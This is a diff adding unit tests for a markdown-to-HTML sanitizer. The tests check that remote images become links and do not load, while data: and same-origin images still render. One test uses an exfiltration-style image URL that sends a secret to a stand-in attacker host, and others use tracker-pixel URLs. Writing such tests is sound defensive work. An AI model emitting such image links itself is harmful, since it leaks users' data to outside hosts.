@@ -76,3 +76,27 @@ describe('renderMarkdownToSafeHtml — XSS sanitization', () => {
     expect(html).not.toMatch(/target="_blank"/)
   })
 })
+
+describe('renderMarkdownToSafeHtml — remote images', () => {
+  it('turns a remote markdown image into a link instead of loading it', () => {
+    const html = renderMarkdownToSafeHtml('![diagram](https://attacker.example/?d=secret)')
+    expect(html).not.toMatch(/<img/i)
+    expect(html).toMatch(/<a [^>]*href="https:\/\/attacker\.example\/\?d=secret"/)
+    expect(html).toMatch(/External image: diagram \(attacker\.example\)/)
+    // The stand-in link is sanitized like any other external link.
+    expect(html).toMatch(/target="_blank"/)
+    expect(html).toMatch(/rel="noopener noreferrer"/)
+  })
+
+  it('turns raw-HTML and protocol-relative remote images into links too', () => {
+    expect(renderMarkdownToSafeHtml('<img src="http://tracker.example/p.gif">')).not.toMatch(/<img/i)
+    expect(renderMarkdownToSafeHtml('<img src="//tracker.example/p.gif">')).not.toMatch(/<img/i)
+  })
+
+  it('still renders data: and same-origin images', () => {
+    expect(renderMarkdownToSafeHtml('![x](data:image/png;base64,AAAA)')).toMatch(/<img/i)
+    expect(renderMarkdownToSafeHtml('![x](/screenshots/a.png)')).toMatch(/<img/i)
+    expect(renderMarkdownToSafeHtml(`![x](${window.location.origin}/a.png)`)).toMatch(/<img/i)
+  })
+})
+
